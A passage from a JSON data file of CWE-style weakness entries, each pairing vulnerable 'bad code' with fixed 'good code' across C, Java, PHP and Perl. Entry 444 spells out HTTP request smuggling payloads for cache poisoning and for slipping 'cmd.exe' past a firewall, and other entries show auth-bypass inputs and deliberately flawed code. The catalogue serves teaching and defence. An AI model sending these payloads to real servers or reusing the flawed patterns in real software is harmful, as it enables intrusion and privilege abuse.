        "demonstrative_examples": "Example 1 A SoC contains a microcontroller (running ring-3\\n                     (least trusted ring) code), a Memory Mapped Input Output\\n                     (MMIO) mapped IP core (containing design-house secrets),\\n                     and a Direct Memory Access (DMA) controller, among several\\n                     other compute elements and peripherals. The SoC implements\\n                     access control to protect the registers in the IP core\\n                     (which registers store the design-house secrets) from\\n                     malicious, ring-3 (least trusted ring) code executing on\\n                     the microcontroller.  The DMA controller, however, is not\\n                     blocked off from accessing the IP core for functional\\n                     reasons. (bad code) Example Language: Other The code in ring-3 (least trusted ring) of the\\n                     microcontroller attempts to directly read the protected\\n                     registers in IP core through MMIO transactions. However,\\n                     this attempt is blocked due to the implemented access\\n                     control. Now, the microcontroller configures the DMA core\\n                     to transfer data from the protected registers to a memory\\n                     region that it has access to. The DMA core, which is\\n                     acting as an intermediary in this transaction, does not\\n                     preserve the identity of the microcontroller and, instead,\\n                     initiates a new transaction with its own identity. Since\\n                     the DMA core has access, the transaction (and hence, the\\n                     attack) is successful. The weakness here is that the intermediary or the\\n                     proxy agent did not ensure the immutability of the\\n                     identity of the microcontroller initiating the\\n                     transaction. (good code) Example Language: Other The DMA\\n                     core forwards this transaction with the identity of the\\n                     code executing on the microcontroller, which is the\\n                     original initiator of the end-to-end transaction. Now the\\n                     transaction is blocked, as a result of forwarding the\\n                     identity of the true initiator which lacks the permission\\n                     to access the confidential MMIO mapped IP core."
    },
    {
        "id": 444,
        "demonstrative_examples": "Example 1 In the following example, a malformed HTTP request is sent to a website that includes a proxy server and a web server with the intent of poisoning the cache to associate one webpage with another malicious webpage. (attack code) POST http://www.website.com/foobar.html HTTP/1.1 Host: www.website.com Connection: Keep-Alive Content-Type: application/x-www-form-urlencoded Content-Length: 0 Content-Length: 44 GET /poison.html HTTP/1.1 Host: www.website.com Bla: GET http://www.website.com/page_to_poison.html HTTP/1.1 Host: www.website.com Connection: Keep-Alive When this request is sent to the proxy server, the proxy server parses the POST request in the first seven lines, and encounters the two \"Content-Length\" headers. The proxy server ignores the first header, so it assumes the request has a body of length 44 bytes. Therefore, it treats the data in the next three lines that contain exactly 44 bytes as the first request\\'s body. The proxy then parses the last three lines which it treats as the client\\'s second request. The request is forwarded by the proxy server to the web server. Unlike the proxy, the web server uses the first \"Content-Length\" header and considers that the first POST request has no body, and the second request is the line with the first GET (note that the second GET is parsed by the web server as the value of the \"Bla\" header). The requests the web server sees are \"POST /foobar.html\" and \"GET /poison.html\", so it sends back two responses with the contents of the \"foobar.html\" page and the \"poison.html\" page, respectively. The proxy matches these responses to the two requests it thinks were sent by the client \"POST /foobar.html\" and \"GET /page_to_poison.html\". If the response is cacheable, the proxy caches the contents of \"poison.html\" under the URL \"page_to_poison.html\", and the cache is poisoned! Any client requesting \"page_to_poison.html\" from the proxy would receive the \"poison.html\" page. When a website includes both a proxy server and a web server some protection against this type of attack can be achieved by installing a web application firewall, or use a web server that includes a stricter HTTP parsing procedure or make all webpages non-cacheable. Additionally, if a web application includes a Java servlet for processing requests, the servlet can check for multiple \"Content-Length\" headers and if they are found the servlet can return an error response thereby preventing the poison page to be cached, as shown below. (good code) Example Language: Java protected void processRequest(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { // Set up response writer object ... try { // check for multiple content length headers Enumeration contentLengthHeaders = request.getHeaders(\"Content-Length\"); int count = 0; while (contentLengthHeaders.hasMoreElements()) { count++; } if (count > 1) { // output error response } else { // process request } } catch (Exception ex) {...} } Example 2 In the following example, a malformed HTTP request is sent to a website that includes a web server with a firewall with the intent of bypassing the web server firewall to smuggle malicious code into the system.. (attack code) POST /page.asp HTTP/1.1 Host: www.website.com Connection: Keep-Alive Content-Length: 49223 zzz...zzz [\"z\" x 49152] POST /page.asp HTTP/1.0 Connection: Keep-Alive Content-Length: 30 POST /page.asp HTTP/1.0 Bla: POST /page.asp?cmd.exe HTTP/1.0 Connection: Keep-Alive When this request is sent to the web server, the first POST request has a content-length of 49,223 bytes, and the firewall treats the line with 49,152 copies of \"z\" and the lines with an additional lines with 71 bytes as its body (49,152+71=49,223). The firewall then continues to parse what it thinks is the second request starting with the line with the third POST request. Note that there is no CRLF after the \"Bla: \" header so the POST in the line is parsed as the value of the \"Bla:\" header. Although the line contains the pattern identified with a worm (\"cmd.exe\"), it is not blocked, since it is considered part of a header value. Therefore, \"cmd.exe\" is smuggled through the firewall. When the request is passed through the firewall the web server the first request is ignored because the web server does not find an expected \"Content-Type: application/x-www-form-urlencoded\" header, and starts parsing the second request. This second request has a content-length of 30 bytes, which is exactly the length of the next two lines up to the space after the \"Bla:\" header. And unlike the firewall, the web server processes the final POST as a separate third request and the \"cmd.exe\" worm is smuggled through the firewall to the web server. To avoid this attack a Web server firewall product must be used that is designed to prevent this type of attack."
    },
    {
        "id": 446,
        "demonstrative_examples": ""
    },
    {
        "id": 447,
        "demonstrative_examples": ""
    },
    {
        "id": 448,
        "demonstrative_examples": ""
    },
    {
        "id": 449,
        "demonstrative_examples": ""
    },
    {
        "id": 450,
        "demonstrative_examples": ""
    },
    {
        "id": 451,
        "demonstrative_examples": ""
    },
    {
        "id": 453,
        "demonstrative_examples": "Example 1 This code attempts to login a user using credentials from a POST request: (bad code) Example Language: PHP // $user and $pass automatically set from POST request if (login_user($user,$pass)) { $authorized = true; } ... if ($authorized) { generatePage(); } \"Because the $authorized variable is never initialized, PHP will automatically set $authorized to any value included in the POST request if register_globals is enabled. An attacker can send a POST request with an unexpected third value 'authorized' set to 'true' and gain authorized status without supplying valid credentials.\" Here is a fixed version: (bad code) Example Language: PHP \"$user = $_POST['user'];\" \"$pass = $_POST['pass'];\" $authorized = false; if (login_user($user,$pass)) { $authorized = true; } ... This code avoids the issue by initializing the $authorized variable to false and explicitly retrieving the login credentials from the $_POST variable. Regardless, register_globals should never be enabled and is disabled by default in current versions of PHP."
    },
    {
        "id": 454,
        "demonstrative_examples": "Example 1 In the Java example below, a system property controls the debug level of the application. (bad code) Example Language: Java int debugLevel = Integer.getInteger(\"com.domain.application.debugLevel\").intValue(); If an attacker is able to modify the system property, then it may be possible to coax the application into divulging sensitive information by virtue of the fact that additional debug information is printed/exposed as the debug level increases. Example 2 This code checks the HTTP POST request for a debug switch, and enables a debug mode if the switch is set. (bad code) Example Language: PHP $debugEnabled = false; if ($_POST[\"debug\"] == \"true\"){ $debugEnabled = true; } /.../ function login($username, $password){ if($debugEnabled){ \"echo 'Debug Activated';\" phpinfo(); $isAdmin = True; return True; } } Any user can activate the debug mode, gaining administrator privileges. An attacker may also use the information printed by the phpinfo() function to further exploit the system. . This example also exhibits Information Exposure Through Debug Information ( CWE-215 )"
    },
    {
        "id": 455,
        "demonstrative_examples": "Example 1 The following code intends to limit certain operations to the administrator only. (bad code) Example Language: Perl $username = GetCurrentUser(); $state = GetStateData($username); if (defined($state)) { $uid = ExtractUserID($state); } # do stuff if ($uid == 0) { DoAdminThings(); } If the application is unable to extract the state information - say, due to a database timeout - then the $uid variable will not be explicitly set by the programmer. This will cause $uid to be regarded as equivalent to \"0\" in the conditional, allowing the original user to perform administrator actions. Even if the attacker cannot directly influence the state data, unexpected errors could cause incorrect privileges to be assigned to a user just by accident."
    },
    {
        "id": 456,
        "demonstrative_examples": "Example 1 This function attempts to extract a pair of numbers from a user-supplied string. (bad code) Example Language: C void parse_data(char *untrusted_input){ int m, n, error; error = sscanf(untrusted_input, \"%d:%d\", &m, &n); if ( EOF == error ){ die(\"Did not specify integer value. Die evil hacker!\\\\n\"); } /* proceed assuming n and m are initialized correctly */ } This code attempts to extract two integer values out of a formatted, user-supplied input. However, if an attacker were to provide an input of the form: (attack code) 123: then only the m variable will be initialized. Subsequent use of n may result in the use of an uninitialized variable ( CWE-457 ). Example 2 Here, an uninitialized field in a Java class is used in a seldom-called method, which would cause a NullPointerException to be thrown. (bad code) Example Language: Java private User user; public void someMethod() { // Do something interesting. ... \"// Throws NPE if user hasn't been properly initialized.\" String username = user.getName(); } Example 3 This code first authenticates a user, then allows a delete command if the user is an administrator. (bad code) Example Language: PHP if (authenticate($username,$password) && setAdmin($username)){ $isAdmin = true; } /.../ if ($isAdmin){ deleteUser($userToDelete); } \"The $isAdmin variable is set to true if the user is an admin, but is uninitialized otherwise. If PHP's register_globals feature is enabled, an attacker can set uninitialized variables like $isAdmin to arbitrary values, in this case gaining administrator privileges by setting $isAdmin to true.\" Example 4 In the following Java code the BankManager class uses the user variable of the class User to allow authorized users to perform bank manager tasks. The user variable is initialized within the method setUser that retrieves the User from the User database. The user is then authenticated as unauthorized user through the method authenticateUser. (bad code) Example Language: Java public class BankManager { // user allowed to perform bank manager tasks private User user = null; private boolean isUserAuthentic = false; // constructor for BankManager class public BankManager() { ... } // retrieve user from database of users public User getUserFromUserDatabase(String username){ ... } // set user variable using username public void setUser(String username) { this.user = getUserFromUserDatabase(username); } // authenticate user public boolean authenticateUser(String username, String password) { if (username.equals(user.getUsername()) && password.equals(user.getPassword())) { isUserAuthentic = true; } return isUserAuthentic; } // methods for performing bank manager tasks ... } However, if the method setUser is not called before authenticateUser then the user variable will not have been initialized and will result in a NullPointerException. The code should verify that the user variable has been initialized before it is used, as in the following code. (good code) Example Language: Java public class BankManager { // user allowed to perform bank manager tasks private User user = null; private boolean isUserAuthentic = false; // constructor for BankManager class public BankManager(String username) { user = getUserFromUserDatabase(username); } // retrieve user from database of users public User getUserFromUserDatabase(String username) {...} // authenticate user public boolean authenticateUser(String username, String password) { if (user == null) { System.out.println(\"Cannot find user \" + username); } else { if (password.equals(user.getPassword())) { isUserAuthentic = true; } } return isUserAuthentic; } // methods for performing bank manager tasks ... } Example 5 This example will leave test_string in an unknown condition when i is the same value as err_val, because test_string is not initialized ( CWE-456 ). Depending on where this code segment appears (e.g. within a function body), test_string might be random if it is stored on the heap or stack. If the variable is declared in static memory, it might be zero or NULL. Compiler optimization might contribute to the unpredictability of this address. (bad code) Example Language: C char *test_string; if (i != err_val) { test_string = \"Hello World!\"; } printf(\"%s\", test_string); When the printf() is reached, test_string might be an unexpected address, so the printf might print junk strings ( CWE-457 ). To fix this code, there are a couple approaches to\\n\\t\\t\\t  making sure that test_string has been properly set once\\n\\t\\t\\t  it reaches the printf(). One solution would be to set test_string to an\\n\\t\\t\\t  acceptable default before the conditional: (good code) Example Language: C char *test_string = \"Done at the beginning\"; if (i != err_val) { test_string = \"Hello World!\"; } printf(\"%s\", test_string); Another solution is to ensure that each\\n\\t\\t\\t  branch of the conditional - including the default/else\\n\\t\\t\\t  branch - could ensure that test_string is set: (good code) Example Language: C char *test_string; if (i != err_val) { test_string = \"Hello World!\"; } else { test_string = \"Done on the other side!\"; } printf(\"%s\", test_string);"
    },
    {
        "id": 457,
        "demonstrative_examples": "Example 1 This code prints a greeting using information stored in a POST request: (bad code) Example Language: PHP \"if (isset($_POST['names'])) {\" \"$nameArray = $_POST['names'];\" } echo \"Hello \" . $nameArray[\\'first\\']; \"This code checks if the POST array 'names' is set before assigning it to the $nameArray variable. However, if the array is not in the POST request, $nameArray will remain uninitialized. This will cause an error when the array is accessed to print the greeting message, which could lead to further exploit.\" Example 2 The following switch statement is intended to set the values of the variables aN and bN before they are used: (bad code) Example Language: C int aN, Bn; switch (ctl) { case -1: aN = 0; bN = 0; break; case 0: aN = i; bN = -i; break; case 1: aN = i + NEXT_SZ; bN = i - NEXT_SZ; break; default: aN = -1; aN = -1; break; } repaint(aN, bN); In the default case of the switch statement, the programmer has accidentally set the value of aN twice. As a result, bN will have an undefined value. Most uninitialized variable issues result in general software reliability problems, but if attackers can intentionally trigger the use of an uninitialized variable, they might be able to launch a denial of service attack by crashing the program. Under the right circumstances, an attacker may be able to control the value of an uninitialized variable by affecting the values on the stack prior to the invocation of the function. Example 3 This example will leave test_string in an unknown condition when i is the same value as err_val, because test_string is not initialized ( CWE-456 ). Depending on where this code segment appears (e.g. within a function body), test_string might be random if it is stored on the heap or stack. If the variable is declared in static memory, it might be zero or NULL. Compiler optimization might contribute to the unpredictability of this address. (bad code) Example Language: C char *test_string; if (i != err_val) { test_string = \"Hello World!\"; } printf(\"%s\", test_string); When the printf() is reached, test_string might be an unexpected address, so the printf might print junk strings ( CWE-457 ). To fix this code, there are a couple approaches to\\n\\t\\t\\t  making sure that test_string has been properly set once\\n\\t\\t\\t  it reaches the printf(). One solution would be to set test_string to an\\n\\t\\t\\t  acceptable default before the conditional: (good code) Example Language: C char *test_string = \"Done at the beginning\"; if (i != err_val) { test_string = \"Hello World!\"; } printf(\"%s\", test_string); Another solution is to ensure that each\\n\\t\\t\\t  branch of the conditional - including the default/else\\n\\t\\t\\t  branch - could ensure that test_string is set: (good code) Example Language: C char *test_string; if (i != err_val) { test_string = \"Hello World!\"; } else { test_string = \"Done on the other side!\"; } printf(\"%s\", test_string);"
    },
    {
        "id": 459,
        "demonstrative_examples": "Example 1 Stream resources in a Java application should be released in a finally block, otherwise an exception thrown before the call to close() would result in an unreleased I/O resource. In the example below, the close() method is called in the try block (incorrect). (bad code) Example Language: Java try { InputStream is = new FileInputStream(path); byte b[] = new byte[is.available()]; is.read(b); is.close(); } catch (Throwable t) { log.error(\"Something bad happened: \" + t.getMessage()); }"
    },
    {
        "id": 460,
        "demonstrative_examples": "Example 1 The following example demonstrates the weakness. (bad code) Example Language: Java public class foo { public static final void main( String args[] ) { boolean returnValue; returnValue=doStuff(); } public static final boolean doStuff( ) { boolean threadLock; boolean truthvalue=true; try { while( //check some condition ) { threadLock=true; //do some stuff to truthvalue threadLock=false; } } catch (Exception e){ System.err.println(\"You did something bad\"); if (something) return truthvalue; } return truthvalue; } } In this case, you may leave a thread locked accidentally."
    },
    {
        "id": 462,
        "demonstrative_examples": "Example 1 The following code adds data to a list and then attempts to sort the data. (bad code) Example Language: Python alist = [] while (foo()): #now assume there is a string data with a key basename queue.append(basename,data) queue.sort() Since basename is not necessarily unique, this may not sort how one would like it to be."
    },
    {
        "id": 463,
        "demonstrative_examples": "Example 1 This example creates a null terminated string and prints it contents. (bad code) Example Language: C char *foo; int counter; foo=calloc(sizeof(char)*10); for (counter=0;counter!=10;counter++) { \"foo[counter]='a';\" printf(\"%s\\\\n\",foo); } The string foo has space for 9 characters and a null terminator, but 10 characters are written to it. As a result, the string foo is not null terminated and calling printf() on it will have unpredictable and possibly dangerous results."
    },
    {
        "id": 464,
        "demonstrative_examples": "Example 1 The following example assigns some character values to a list of characters and prints them each individually, and then as a string. The third character value is intended to be an integer taken from user input and converted to an int. (bad code) Example Language: C char *foo; foo=malloc(sizeof(char)*5); \"foo[0]='a';\" \"foo[1]='a';\" foo[2]=atoi(getc(stdin)); \"foo[3]='c';\" \"foo[4]='\\\\0'\" printf(\"%c %c %c %c %c \\\\n\",foo[0],foo[1],foo[2],foo[3],foo[4]); printf(\"%s\\\\n\",foo); The first print statement will print each character separated by a space. However, if a non-integer is read from stdin by getc, then atoi will not make a conversion and return 0. When foo is printed as a string, the 0 at character foo[2] will act as a NULL terminator and foo[3] will never be printed."
    },
    {
        "id": 466,
        "demonstrative_examples": ""
    },
    {
        "id": 467,
        "demonstrative_examples": "Example 1 Care should be taken to ensure sizeof returns the size of the data structure itself, and not the size of the pointer to the data structure. In this example, sizeof(foo) returns the size of the pointer. (bad code) Example Language: C double *foo; ... foo = (double *)malloc(sizeof(foo)); In this example, sizeof(*foo) returns the size of the data structure and not the size of the pointer. (good code) Example Language: C double *foo; ... foo = (double *)malloc(sizeof(*foo)); Example 2 This example defines a fixed username and password. The AuthenticateUser() function is intended to accept a username and a password from an untrusted user, and check to ensure that it matches the username and password. If the username and password match, AuthenticateUser() is intended to indicate that authentication succeeded. (bad code) /* Ignore CWE-259 (hard-coded password) and CWE-309 (use of password system for authentication) for this example. */ char *username = \"admin\"; char *pass = \"password\"; int AuthenticateUser(char *inUser, char *inPass) { printf(\"Sizeof username = %d\\\\n\", sizeof(username)); printf(\"Sizeof pass = %d\\\\n\", sizeof(pass)); if (strncmp(username, inUser, sizeof(username))) { printf(\"Auth failure of username using sizeof\\\\n\"); return(AUTH_FAIL); } /* Because of CWE-467 , the sizeof returns 4 on many platforms and architectures. */ if (! strncmp(pass, inPass, sizeof(pass))) { printf(\"Auth success of password using sizeof\\\\n\"); return(AUTH_SUCCESS); } else { printf(\"Auth fail of password using sizeof\\\\n\"); return(AUTH_FAIL); } } int main (int argc, char **argv) { int authResult; if (argc < 3) { ExitError(\"Usage: Provide a username and password\"); } authResult = AuthenticateUser(argv[1], argv[2]); if (authResult != AUTH_SUCCESS) { ExitError(\"Authentication failed\"); } else { DoAuthenticatedTask(argv[1]); } } In AuthenticateUser(), because sizeof() is applied to a parameter with an array type, the sizeof() call might return 4 on many modern architectures. As a result, the strncmp() call only checks the first four characters of the input password, resulting in a partial comparison ( CWE-187 ), leading to improper authentication ( CWE-287 ). Because of the partial comparison, any of these passwords would still cause authentication to succeed for the \"admin\" user: (attack code) pass5 passABCDEFGH passWORD Because only 4 characters are checked, this significantly reduces the search space for an attacker, making brute force attacks more feasible. The same problem also applies to the username, so values such as \"adminXYZ\" and \"administrator\" will succeed for the username."
    },
    {
        "id": 468,
        "demonstrative_examples": "Example 1 This example attempts to calculate the position of the second byte of a pointer. (bad code) Example Language: C int *p = x; char * second_char = (char *)(p + 1); In this example, second_char is intended to point to the second byte of p. But, adding 1 to p actually adds sizeof(int) to p, giving a result that is incorrect (3 bytes off on 32-bit platforms). If the resulting memory address is read, this could potentially be an information leak. If it is a write, it could be a security-critical write to unauthorized memory-- whether or not it is a buffer overflow. Note that the above code may also be wrong in other ways, particularly in a little endian environment."
    },
    {
        "id": 469,
        "demonstrative_examples": "Example 1 The following example contains the method size that is used to determine the number of nodes in a linked list. The method is passed a pointer to the head of the linked list. (bad code) Example Language: C struct node { int data; struct node* next; }; // Returns the number of nodes in a linked list from // the given pointer to the head of the list. int size(struct node* head) { struct node* current = head; struct node* tail; while (current != NULL) { tail = current; current = current->next; } return tail - head; } // other methods for manipulating the list ... However, the method creates a pointer that points to the end of the list and uses pointer subtraction to determine the number of nodes in the list by subtracting the tail pointer from the head pointer. There no guarantee that the pointers exist in the same memory area, therefore using pointer subtraction in this way could return incorrect results and allow other unintended behavior. In this example a counter should be used to determine the number of nodes in the list, as shown in the following code. (good code) Example Language: C ... int size(struct node* head) { struct node* current = head; int count = 0; while (current != NULL) { count++; current = current->next; } return count; }"
    },
    {
        "id": 470,
        "demonstrative_examples": "Example 1 A common reason that programmers use the reflection API is to implement their own command dispatcher. The following example shows a command dispatcher that does not use reflection: (good code) Example Language: Java String ctl = request.getParameter(\"ctl\"); Worker ao = null; if (ctl.equals(\"Add\")) { ao = new AddCommand(); } else if (ctl.equals(\"Modify\")) { ao = new ModifyCommand(); } else { throw new UnknownActionError(); } ao.doAction(request); A programmer might refactor this code to use reflection as follows: (bad code) Example Language: Java String ctl = request.getParameter(\"ctl\"); Class cmdClass = Class.forName(ctl + \"Command\"); Worker ao = (Worker) cmdClass.newInstance(); ao.doAction(request); \"The refactoring initially appears to offer a number of advantages. There are fewer lines of code, the if/else blocks have been entirely eliminated, and it is now possible to add new command types without modifying the command dispatcher. However, the refactoring allows an attacker to instantiate any object that implements the Worker interface. If the command dispatcher is still responsible for access control, then whenever programmers create a new class that implements the Worker interface, they must remember to modify the dispatcher's access control code. If they do not modify the access control code, then some Worker classes will not have any access control.\" One way to address this access control problem is to make the Worker object responsible for performing the access control check. An example of the re-refactored code follows: (bad code) Example Language: Java String ctl = request.getParameter(\"ctl\"); Class cmdClass = Class.forName(ctl + \"Command\"); Worker ao = (Worker) cmdClass.newInstance(); ao.checkAccessControl(request); ao.doAction(request); \"Although this is an improvement, it encourages a decentralized approach to access control, which makes it easier for programmers to make access control mistakes. This code also highlights another security problem with using reflection to build a command dispatcher. An attacker can invoke the default constructor for any kind of object. In fact, the attacker is not even constrained to objects that implement the Worker interface; the default constructor for any object in the system can be invoked. If the object does not implement the Worker interface, a ClassCastException will be thrown before the assignment to ao, but if the constructor performs operations that work in the attacker's favor, the damage will already have been done. Although this scenario is relatively benign in simple applications, in larger applications where complexity grows exponentially it is not unreasonable that an attacker could find a constructor to leverage as part of an attack.\""
    },
    {
        "id": 471,
        "demonstrative_examples": "Example 1 In the code excerpt below, an array returned by a Java method is modified despite the fact that arrays are mutable. (bad code) Example Language: Java String[] colors = car.getAllPossibleColors(); colors[0] = \"Red\";"
    },
    {
        "id": 472,
        "demonstrative_examples": "Example 1 In this example, a web application uses the value of a hidden form field (accountID) without having done any input validation because it was assumed to be immutable. (bad code) Example Language: Java String accountID = request.getParameter(\"accountID\"); User user = getUserFromID(Long.parseLong(accountID)); Example 2 Hidden fields should not be trusted as secure parameters. An attacker can intercept and alter hidden fields in a post to the server as easily as user input fields. An attacker can simply parse the HTML for the substring: (bad code) Example Language: HTML <input type=\"hidden\" or even just \"hidden\". Hidden field values displayed later in the session, such as on the following page, can open a site up to cross-site scripting attacks."
    },
    {
        "id": 473,
        "demonstrative_examples": ""
    },
    {
        "id": 474,
        "demonstrative_examples": ""
    },
    {
        "id": 475,
        "demonstrative_examples": ""
    },
    {
        "id": 476,
        "demonstrative_examples": "Example 1 While there are no complete fixes aside from conscientious programming, the following steps will go a long way to ensure that NULL pointer dereferences do not occur. (good code) if (pointer1 != NULL) { /* make use of pointer1 */ /* ... */ } If you are working with a multithreaded or otherwise asynchronous environment, ensure that proper locking APIs are used to lock before the if statement; and unlock when it has finished. Example 2 This example takes an IP address from a user, verifies that it is well formed and then looks up the hostname and copies it into a buffer. (bad code) Example Language: C void host_lookup(char *user_supplied_addr){ struct hostent *hp; in_addr_t *addr; char hostname[64]; in_addr_t inet_addr(const char *cp); /*routine that ensures user_supplied_addr is in the right format for conversion */ validate_addr_form(user_supplied_addr); addr = inet_addr(user_supplied_addr); hp = gethostbyaddr( addr, sizeof(struct in_addr), AF_INET); strcpy(hostname, hp->h_name); } If an attacker provides an address that appears to be well-formed, but the address does not resolve to a hostname, then the call to gethostbyaddr() will return NULL. Since the code does not check the return value from gethostbyaddr ( CWE-252 ), a NULL pointer dereference ( CWE-476 ) would then occur in the call to strcpy(). Note that this code is also vulnerable to a buffer overflow ( CWE-119 ). Example 3 In the following code, the programmer assumes that the system always has a property named \"cmd\" defined. If an attacker can control the program\\'s environment so that \"cmd\" is not defined, the program throws a NULL pointer exception when it attempts to call the trim() method. (bad code) Example Language: Java String cmd = System.getProperty(\"cmd\"); cmd = cmd.trim(); Example 4 This Android application has registered to handle a URL when sent an intent: (bad code) Example Language: Java ... IntentFilter filter = new IntentFilter(\"com.example.URLHandler.openURL\"); MyReceiver receiver = new MyReceiver(); registerReceiver(receiver, filter); ... public class UrlHandlerReceiver extends BroadcastReceiver { @Override public void onReceive(Context context, Intent intent) { if(\"com.example.URLHandler.openURL\".equals(intent.getAction())) { String URL = intent.getStringExtra(\"URLToOpen\"); int length = URL.length(); ... } } } The application assumes the URL will always be included in the intent. When the URL is not present, the call to getStringExtra() will return null, thus causing a null pointer exception when length() is called."
    },
    {
        "id": 477,
        "demonstrative_examples": "Example 1 \"The following code uses the deprecated function getpw() to verify that a plaintext password matches a user's encrypted password. If the password is valid, the function sets result to 1; otherwise it is set to 0.\" (bad code) Example Language: C ... getpw(uid, pwdline); for (i=0; i<3; i++){ cryptpw=strtok(pwdline, \":\"); pwdline=0; } result = strcmp(crypt(plainpw,cryptpw), cryptpw) == 0; ... Although the code often behaves correctly, using the getpw() function can be problematic from a security standpoint, because it can overflow the buffer passed to its second parameter. Because of this vulnerability, getpw() has been supplanted by getpwuid(), which performs the same lookup as getpw() but returns a pointer to a statically-allocated structure to mitigate the risk. Not all functions are deprecated or replaced because they pose a security risk. However, the presence of an obsolete function often indicates that the surrounding code has been neglected and may be in a state of disrepair. Software security has not been a priority, or even a consideration, for very long. If the program uses deprecated or obsolete functions, it raises the probability that there are security problems lurking nearby. Example 2 In the following code, the programmer assumes that the system always has a property named \"cmd\" defined. If an attacker can control the program\\'s environment so that \"cmd\" is not defined, the program throws a null pointer exception when it attempts to call the \"Trim()\" method. (bad code) Example Language: Java String cmd = null; ... cmd = Environment.GetEnvironmentVariable(\"cmd\"); cmd = cmd.Trim(); Example 3 The following code constructs a string object from an array of bytes and a value that specifies the top 8 bits of each 16-bit Unicode character. (bad code) Example Language: Java ... String name = new String(nameBytes, highByte); ... In this example, the constructor may not correctly convert bytes to characters depending upon which charset is used to encode the string represented by nameBytes. Due to the evolution of the charsets used to encode strings, this constructor was deprecated and replaced by a constructor that accepts as one of its parameters the name of the charset used to encode the bytes for conversion."
    },
    {
        "id": 478,
        "demonstrative_examples": "Example 1 The following does not properly check the return code in the case where the security_check function returns a -1 value when an error occurs. If an attacker can supply data that will invoke an error, the attacker can bypass the security check: (bad code) Example Language: C #define FAILED 0 #define PASSED 1 int result; ... result = security_check(data); switch (result) { case FAILED: printf(\"Security check failed!\\\\n\"); exit(-1); //Break never reached because of exit() break; case PASSED: printf(\"Security check passed.\\\\n\"); break; } // program execution continues... ... Instead a default label should be used for unaccounted conditions: (good code) Example Language: C #define FAILED 0 #define PASSED 1 int result; ... result = security_check(data); switch (result) { case FAILED: printf(\"Security check failed!\\\\n\"); exit(-1); //Break never reached because of exit() break; case PASSED: printf(\"Security check passed.\\\\n\"); break; default: printf(\"Unknown error (%d), exiting...\\\\n\",result); exit(-1); } This label is used because the assumption cannot be made that all possible cases are accounted for. A good practice is to reserve the default case for error handling. Example 2 In the following Java example the method getInterestRate retrieves the interest rate for the number of points for a mortgage. The number of points is provided within the input parameter and a switch statement will set the interest rate value to be returned based on the number of points. (bad code) Example Language: Java public static final String INTEREST_RATE_AT_ZERO_POINTS = \"5.00\"; public static final String INTEREST_RATE_AT_ONE_POINTS = \"4.75\"; public static final String INTEREST_RATE_AT_TWO_POINTS = \"4.50\"; ... public BigDecimal getInterestRate(int points) { BigDecimal result = new BigDecimal(INTEREST_RATE_AT_ZERO_POINTS); switch (points) { case 0: result = new BigDecimal(INTEREST_RATE_AT_ZERO_POINTS); break; case 1: result = new BigDecimal(INTEREST_RATE_AT_ONE_POINTS); break; case 2: result = new BigDecimal(INTEREST_RATE_AT_TWO_POINTS); break; } return result; } However, this code assumes that the value of the points input parameter will always be 0, 1 or 2 and does not check for other incorrect values passed to the method. This can be easily accomplished by providing a default label in the switch statement that outputs an error message indicating an invalid value for the points input parameter and returning a null value. (good code) Example Language: Java public static final String INTEREST_RATE_AT_ZERO_POINTS = \"5.00\"; public static final String INTEREST_RATE_AT_ONE_POINTS = \"4.75\"; public static final String INTEREST_RATE_AT_TWO_POINTS = \"4.50\"; ... public BigDecimal getInterestRate(int points) { BigDecimal result = new BigDecimal(INTEREST_RATE_AT_ZERO_POINTS); switch (points) { case 0: result = new BigDecimal(INTEREST_RATE_AT_ZERO_POINTS); break; case 1: result = new BigDecimal(INTEREST_RATE_AT_ONE_POINTS); break; case 2: result = new BigDecimal(INTEREST_RATE_AT_TWO_POINTS); break; default: System.err.println(\"Invalid value for points, must be 0, 1 or 2\"); System.err.println(\"Returning null value for interest rate\"); result = null; } return result; }"
    },
    {
        "id": 479,
        "demonstrative_examples": "Example 1 In this example, a signal handler uses syslog() to log a message: (bad code) char *message; void sh(int dummy) { syslog(LOG_NOTICE,\"%s\\\\n\",message); sleep(10); exit(0); } int main(int argc,char* argv[]) { ... signal(SIGHUP,sh); signal(SIGTERM,sh); sleep(10); exit(0); } If the execution of the first call to the signal handler is suspended after invoking syslog(), and the signal handler is called a second time, the memory allocated by syslog() enters an undefined, and possibly, exploitable state."
    },
    {
        "id": 480,
        "demonstrative_examples": "Example 1 The following C/C++ and C# examples attempt to validate an int input parameter against the integer value 100. (bad code) Example Language: C int isValid(int value) { if (value=100) { printf(\"Value is valid\\\\n\"); return(1); } printf(\"Value is not valid\\\\n\"); return(0); } (bad code) Example Language: C# bool isValid(int value) { if (value=100) { Console.WriteLine(\"Value is valid.\"); return true; } Console.WriteLine(\"Value is not valid.\"); return false; } However, the expression to be evaluated in the if statement uses the assignment operator \"=\" rather than the comparison operator \"==\". The result of using the assignment operator instead of the comparison operator causes the int variable to be reassigned locally and the expression in the if statement will always evaluate to the value on the right hand side of the expression. This will result in the input value not being properly validated, which can cause unexpected results. Example 2 The following C/C++ example shows a simple implementation of a stack that includes methods for adding and removing integer values from the stack. The example uses pointers to add and remove integer values to the stack array variable. (bad code) Example Language: C #define SIZE 50 int *tos, *p1, stack[SIZE]; void push(int i) { p1++; if(p1==(tos+SIZE)) { // Print stack overflow error message and exit } *p1 == i; } int pop(void) { if(p1==tos) { // Print stack underflow error message and exit } p1--; return *(p1+1); } int main(int argc, char *argv[]) { // initialize tos and p1 to point to the top of stack tos = stack; p1 = stack; // code to add and remove items from stack ... return 0; } The push method includes an expression to assign the integer value to the location in the stack pointed to by the pointer variable. However, this expression uses the comparison operator \"==\" rather than the assignment operator \"=\". The result of using the comparison operator instead of the assignment operator causes erroneous values to be entered into the stack and can cause unexpected results."
    },
    {
        "id": 481,
